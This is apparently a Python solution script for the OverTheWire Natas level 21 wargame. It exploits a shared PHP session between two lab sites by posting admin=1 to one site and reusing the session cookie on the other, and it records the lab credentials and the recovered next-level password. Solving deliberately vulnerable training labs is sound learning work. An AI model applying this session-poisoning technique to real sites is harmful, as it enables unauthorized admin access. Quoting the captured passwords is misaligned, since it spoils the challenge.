#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

username = "natas21"
password = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"

url = "http://%s.natas.labs.overthewire.org/?debug" % username
experimenter = (
    "http://%s-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1"
    % username
)
session = requests.Session()

# the first reqquest is to inizialize the session
response = session.post(experimenter, auth=(username, password))
content = response.text
soup = BeautifulSoup(content, "html.parser").prettify()
cookie_val = session.cookies["PHPSESSID"]
print(soup)
print("=" * 80)


# the second reqquest is to get the password from the url after setting { $_Session['admin'] = 1 }
cookie = {"PHPSESSID": cookie_val}
response = session.get(url, cookies=cookie, auth=(username, password))
content = response.text
soup = BeautifulSoup(content, "html.parser").prettify()
print(soup)
print("=" * 80)


# this time we got an /index-source.html
# this website is related to another one that has some session keys and values
# that we may be able to change or add another one { $_Session['admin'] = 1 }
# and that will give us the password
#
# we got it right:
# Username: natas22
# Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
